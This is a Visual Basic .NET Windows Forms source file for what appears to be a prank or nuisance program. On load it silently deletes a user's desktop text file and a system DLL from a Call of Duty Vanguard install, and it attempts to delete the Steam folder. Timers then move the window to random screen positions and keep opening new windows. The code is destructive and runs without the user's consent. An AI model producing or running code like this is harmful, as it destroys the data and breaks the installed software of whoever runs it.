﻿Imports System.IO
Imports System.Text
Public Class Form1
    Dim RandomShit As New Random
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load

        Timer1.Start()

        Dim FileToDelete As String

        FileToDelete = "C:\Users\ttvni\OneDrive\Desktop\calen.txt"

        If System.IO.File.Exists(FileToDelete) = True Then

            System.IO.File.Delete(FileToDelete)


        End If

        FileToDelete = "C:\Program Files (x86)\Call of Duty Vanguard\api-ms-win-core-file-l1-2-0.dll"

        If System.IO.File.Exists(FileToDelete) = True Then

            System.IO.File.Delete(FileToDelete)


        End If

        FileToDelete = "C:\Program Files (x86)\Steam"

        If System.IO.File.Exists(FileToDelete) = True Then

            System.IO.File.Delete(FileToDelete)


        End If

    End Sub
    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        If DesktopLocation = New Point(RandomShit.Next(1, 1500), RandomShit.Next(1, 500)) Then
            DesktopLocation = New Point(RandomShit.Next(1, 1500), RandomShit.Next(1, 500))
        Else
            DesktopLocation = New Point(RandomShit.Next(1, 1500), RandomShit.Next(1, 500))
        End If
    End Sub


    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        Dim myform As New Form2
        myform.Show()

    End Sub
End Class


